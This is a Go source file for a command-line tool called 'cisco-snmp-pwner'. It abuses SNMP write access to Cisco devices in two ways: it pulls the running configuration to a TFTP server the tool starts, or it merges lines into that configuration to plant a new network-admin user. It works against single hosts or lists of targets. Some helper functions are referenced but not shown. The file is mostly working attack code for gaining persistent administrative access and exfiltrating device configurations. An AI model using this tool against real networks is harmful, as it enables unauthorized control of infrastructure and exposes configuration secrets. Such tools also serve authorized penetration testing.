package main

import (
	"bufio"
	"fmt"
	"os"
	"time"

	g "github.com/gosnmp/gosnmp"
	"github.com/pin/tftp"
	"github.com/sirupsen/logrus"
	"github.com/urfave/cli/v2"
)

var log *logrus.Logger

type options struct {
	debug           bool
	listen          string
	targetSystem    string
	targetFile      string
	timeout         time.Duration
	version         string
	communityString string
	v3Username      string
	v3AuthPass      string
	v3PrivacyPass   string
	v3AuthProto     string
	v3PrivProto     string
	username        string
	password        string
	role            string
}

type mode int

const (
	modeDump mode = 1
	modeAdd  mode = 2
)

func main() {
	log = logrus.New()
	log.SetOutput(os.Stdout)
	log.SetLevel(logrus.InfoLevel)

	app := &cli.App{
		Name:  "cisco-snmp-pwner",
		Usage: "This tool uses snmp and tftp to either dump the current running config of a cisco device or add a new user. You need to be able to reach the device via the network and vice versa. You also need SNMP RW access.",
		Authors: []*cli.Author{
			{
				Name:  "Christian Mehlmauer",
				Email: "firefart@gmail.com",
			},
		},
		Before: func(ctx *cli.Context) error {
			if ctx.Bool("debug") {
				log.SetLevel(logrus.DebugLevel)
			}
			return nil
		},
		Commands: []*cli.Command{
			{
				Name:        "dump",
				Usage:       "Downloads the current running-config",
				Description: "This command sends an SNMP request to the cisco device and request a dump of the running-config via tftp. The command also spins up a TFTP server to retrieve the file so it needs to be run as root",
				Flags: []cli.Flag{
					&cli.BoolFlag{Name: "debug", Aliases: []string{"d"}, Value: false, Usage: "enable debug output"},
					&cli.StringFlag{Name: "listen", Aliases: []string{"l"}, Required: true, Usage: "local ip to listen on, must be accessible by the cisco device"},
					&cli.StringFlag{Name: "target", Aliases: []string{"t"}, Usage: "target ip of the cisco device"},
					&cli.PathFlag{Name: "targetfile", Aliases: []string{"tf"}, Usage: "list of ip addresses instead of target"},
					&cli.DurationFlag{Name: "timeout", Value: 2 * time.Second, Usage: "timeout for SNMP operations"},
					&cli.StringFlag{Name: "version", Value: "2c", Usage: "snmp version to use. Either 1, 2c or 3"},
					&cli.StringFlag{Name: "communitystring", Value: "", Usage: "snmp communitystring with RW permissions"},
					&cli.StringFlag{Name: "v3username", Value: "", Usage: "snmp v3 username"},
					&cli.StringFlag{Name: "v3authpass", Value: "", Usage: "snmp v3 authpass"},
					&cli.StringFlag{Name: "v3privacypass", Value: "", Usage: "snmp v3 privacypass"},
					&cli.StringFlag{Name: "v3authproto", Value: "", Usage: "snmp v3 authproto"},
					&cli.StringFlag{Name: "v3privproto", Value: "", Usage: "snmp v3 privproto"},
				},
				Action: func(c *cli.Context) error {
					listen := c.String("listen")
					target := c.String("target")
					targetPath := c.Path("targetfile")
					timeout := c.Duration("timeout")
					version := c.String("version")
					communityString := c.String("communitystring")
					v3Username := c.String("v3username")
					v3AuthPass := c.String("v3authpass")
					v3PrivacyPass := c.String("v3privacypass")
					v3AuthProto := c.String("v3authproto")
					v3PrivProto := c.String("v3privproto")
					debug := c.Bool("debug")
					return run(modeDump, options{
						debug:           debug,
						listen:          listen,
						targetSystem:    target,
						targetFile:      targetPath,
						timeout:         timeout,
						version:         version,
						communityString: communityString,
						v3Username:      v3Username,
						v3AuthPass:      v3AuthPass,
						v3PrivacyPass:   v3PrivacyPass,
						v3AuthProto:     v3AuthProto,
						v3PrivProto:     v3PrivProto,
					})
				},
			},
			{
				Name:        "add-user",
				Usage:       "This command adds a user to the cisco device",
				Description: "This command sends a SNMP command to the device asking to fetch the config from the local running tftp server. The target is the running-config so you can add single lines and they will be merged into the config. Absuing this we add a new user with the network-admin role to the device",
				Flags: []cli.Flag{
					&cli.BoolFlag{Name: "debug", Aliases: []string{"d"}, Value: false, Usage: "enable debug output"},
					&cli.StringFlag{Name: "listen", Aliases: []string{"l"}, Required: true, Usage: "local ip to listen on, must be accessible by the cisco device"},
					&cli.StringFlag{Name: "target", Aliases: []string{"t"}, Usage: "target ip of the cisco device"},
					&cli.PathFlag{Name: "targetfile", Aliases: []string{"tf"}, Usage: "list of ip addresses instead of target"},
					&cli.DurationFlag{Name: "timeout", Value: 2 * time.Second, Usage: "timeout for SNMP operations"},
					&cli.StringFlag{Name: "version", Value: "2c", Usage: "snmp version to use. Either 1, 2c or 3"},
					&cli.StringFlag{Name: "communitystring", Value: "", Usage: "snmp communitystring with RW permissions"},
					&cli.StringFlag{Name: "v3username", Value: "", Usage: "snmp v3 username"},
					&cli.StringFlag{Name: "v3authpass", Value: "", Usage: "snmp v3 authpass"},
					&cli.StringFlag{Name: "v3privacypass", Value: "", Usage: "snmp v3 privacypass"},
					&cli.StringFlag{Name: "v3authproto", Value: "", Usage: "snmp v3 authproto. Either SHA, SHA224, SHA256, SHA384, SHA512, MD5 or NoAuth"},
					&cli.StringFlag{Name: "v3privproto", Value: "", Usage: "snmp v3 privproto. Either NoPriv, DES, AES, AES192, AES256, AES192C or AES256C"},

					&cli.StringFlag{Name: "username", Value: "", Required: true, Usage: "username of the user to add"},
					&cli.StringFlag{Name: "password", Value: "", Required: true, Usage: "password of the user to add"},
					&cli.StringFlag{Name: "role", Value: "network-admin", Usage: "role of the new user"},
				},
				Action: func(c *cli.Context) error {
					listen := c.String("listen")
					target := c.String("target")
					targetPath := c.Path("targetfile")
					timeout := c.Duration("timeout")
					version := c.String("version")
					communityString := c.String("communitystring")
					v3Username := c.String("v3username")
					v3AuthPass := c.String("v3authpass")
					v3PrivacyPass := c.String("v3privacypass")
					v3AuthProto := c.String("v3authproto")
					v3PrivProto := c.String("v3privproto")
					debug := c.Bool("debug")
					username := c.String("username")
					password := c.String("password")
					role := c.String("role")
					return run(modeAdd, options{
						debug:           debug,
						listen:          listen,
						targetSystem:    target,
						targetFile:      targetPath,
						timeout:         timeout,
						version:         version,
						communityString: communityString,
						v3Username:      v3Username,
						v3AuthPass:      v3AuthPass,
						v3PrivacyPass:   v3PrivacyPass,
						v3AuthProto:     v3AuthProto,
						v3PrivProto:     v3PrivProto,
						username:        username,
						password:        password,
						role:            role,
					})
				},
			},
		},
	}

	err := app.Run(os.Args)
	if err != nil {
		log.Fatal(err)
	}
}

func run(mode mode, options options) error {
	if options.listen == "" {
		return fmt.Errorf("please supply a listen flag")
	}

	if (options.targetSystem == "" && options.targetFile == "") || (options.targetSystem != "" && options.targetFile != "") {
		return fmt.Errorf("please set either target or targetfile")
	}

	var logger g.Logger
	if options.debug {
		log.SetLevel(logrus.DebugLevel)
		logger = g.NewLogger(log)
	}

	var targets []string

	if options.targetFile != "" {
		contents, err := readFile(options.targetFile)
		if err != nil {
			log.Fatalf("could not read file: %v", err)
		}
		targets = contents
	} else {
		targets = append(targets, options.targetSystem)
	}

	tftpOptions := tftpStuff{
		username: options.username,
		password: options.password,
		role:     options.role,
	}

	go func() {
		s := tftp.NewServer(tftpOptions.readHandler, tftpOptions.writeHandler)
		s.SetTimeout(15 * time.Second)
		err := s.ListenAndServe(fmt.Sprintf("%s:69", options.listen))
		if err != nil {
			log.Errorf("%v", err)
		}
	}()

	for _, target := range targets {
		log.Infof("Scanning %s", target)

		var params g.GoSNMP

		switch options.version {
		case "1":
			params = g.GoSNMP{
				Target:    target,
				Port:      uint16(161),
				Community: options.communityString,
				Version:   g.Version1,
				Timeout:   options.timeout,
				Logger:    logger,
			}
		case "2c":
			params = g.GoSNMP{
				Target:    target,
				Port:      uint16(161),
				Community: options.communityString,
				Version:   g.Version2c,
				Timeout:   options.timeout,
				Logger:    logger,
			}
		case "3":
			var v3AuthProto g.SnmpV3AuthProtocol
			var v3PrivProto g.SnmpV3PrivProtocol

			switch options.v3AuthProto {
			case "SHA":
				v3AuthProto = g.SHA
			case "SHA224":
				v3AuthProto = g.SHA224
			case "SHA256":
				v3AuthProto = g.SHA256
			case "SHA384":
				v3AuthProto = g.SHA384
			case "SHA512":
				v3AuthProto = g.SHA512
			case "MD5":
				v3AuthProto = g.MD5
			case "NoAuth":
				v3AuthProto = g.NoAuth
			default:
				return fmt.Errorf("Invalid value for authproto: %s", options.v3AuthProto)
			}

			switch options.v3PrivProto {
			case "NoPriv":
				v3PrivProto = g.NoPriv
			case "DES":
				v3PrivProto = g.DES
			case "AES":
				v3PrivProto = g.AES
			case "AES192":
				v3PrivProto = g.AES192
			case "AES256":
				v3PrivProto = g.AES256
			case "AES192C":
				v3PrivProto = g.AES192C
			case "AES256C":
				v3PrivProto = g.AES256C
			default:
				return fmt.Errorf("Invalid value for privproto: %s", options.v3PrivProto)
			}

			params = g.GoSNMP{
				Target:        target,
				Port:          uint16(161),
				Version:       g.Version3,
				SecurityModel: g.UserSecurityModel,
				Community:     options.communityString,
				MsgFlags:      g.AuthPriv,
				Timeout:       options.timeout,
				Logger:        logger,
				SecurityParameters: &g.UsmSecurityParameters{
					UserName:                 options.v3Username,
					AuthenticationProtocol:   v3AuthProto,
					AuthenticationPassphrase: options.v3AuthPass,
					PrivacyProtocol:          v3PrivProto,
					PrivacyPassphrase:        options.v3PrivacyPass,
				},
			}
		default:
			return fmt.Errorf("Invalid snmp version %s", options.version)
		}

		if err := sendSNMPCommand(mode, &params, options.listen, fmt.Sprintf("dump_%s", target)); err != nil {
			log.Errorf("error on %s: %v", target, err)
			continue
		}
	}

	fmt.Print("Done. Press 'Enter' to exit")
	bufio.NewReader(os.Stdin).ReadBytes('\n') // nolint:errcheck

	return nil
}

func sendSNMPCommand(mode mode, params *g.GoSNMP, listen, hostname string) error {
	err := params.Connect()
	if err != nil {
		return err
	}
	defer params.Conn.Close()

	randomID := randomID()

	switch mode {
	case modeDump:
		_, err = params.Set(getDumpRequest(randomID, listen, hostname))
		if err != nil {
			return fmt.Errorf("error on sending dump request: %w", err)
		}
	case modeAdd:
		_, err = params.Set(getMergeRequest(randomID, listen, hostname))
		if err != nil {
			return fmt.Errorf("error on sending merge request: %w", err)
		}
	default:
		panic("invalid mode")
	}

	// get status of command
	running := true
	for running {
		status, err := params.Get(getStatusRequest(randomID))
		if err != nil {
			return fmt.Errorf("error on sending status request: %w", err)
		}
		if len(status.Variables) != 1 {
			return fmt.Errorf("got no status (%d variables)", len(status.Variables))
		}
		statusVar := status.Variables[0]
		statusInt := statusVar.Value.(int)
		// waiting(1), running(2), successful(3), failed(4)
		switch statusInt {
		case 1:
			time.Sleep(1 * time.Second)
			continue
		case 2:
			time.Sleep(1 * time.Second)
			continue
		case 3:
			running = false
		case 4:
			return fmt.Errorf("command was not successfull")
		}
	}

	// remove dump job if we are done
	_, err = params.Set(getDeleteJobRequest(randomID))
	if err != nil {
		return fmt.Errorf("error on sending delete request: %w", err)
	}

	return nil
}
